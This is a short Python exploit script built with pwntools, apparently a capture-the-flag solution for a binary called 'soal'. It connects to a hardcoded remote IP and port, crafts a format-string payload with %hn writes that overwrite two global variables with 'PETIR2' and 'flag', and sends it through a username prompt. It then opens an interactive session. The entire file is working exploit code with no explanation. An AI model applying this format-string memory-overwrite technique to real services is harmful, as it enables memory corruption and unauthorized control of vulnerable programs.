from pwn import *
from Crypto.Util.number import bytes_to_long

# r = process("./soal")

# r = remote("localhost",13304)
r = remote("104.248.150.36",11104)
pass2=0x404010
file=0x404018
# gdb.attach(r,'''
# 	b *0x401317
# 	b *0x40121a
# 	c
# 	''')

temp = bytes_to_long("PETIR2"[::-1])
offset = []
for i in range(3):
   tmp = temp & 0xffff
   offset.append(tmp)
   temp >>= 16

temp = bytes_to_long("flag"[::-1])
for i in range(2):
   tmp = temp & 0xffff
   offset.append(tmp)
   temp >>= 16

p = '%{}x%17$hn'.format(offset[0])
p += '%{}x%18$hn'.format(offset[1]-offset[0]+0x10000)
p += '%{}x%19$hn'.format(offset[2]-offset[1]+0x10000)
p += '%{}x%20$hn'.format(offset[3]-offset[2]+0x10000)
p += '%{}x%21$hn'.format(offset[4]-offset[3]+0x10000)
p = p.ljust(72, '\x00')
p += p64(pass2)
p += p64(pass2+2)
p += p64(pass2+4)
p += p64(file)
p += p64(file+2)

r.sendlineafter("Username : ",p)
r.sendlineafter("Password : ","passwd123")

r.recvuntil("Secret")

r.interactive()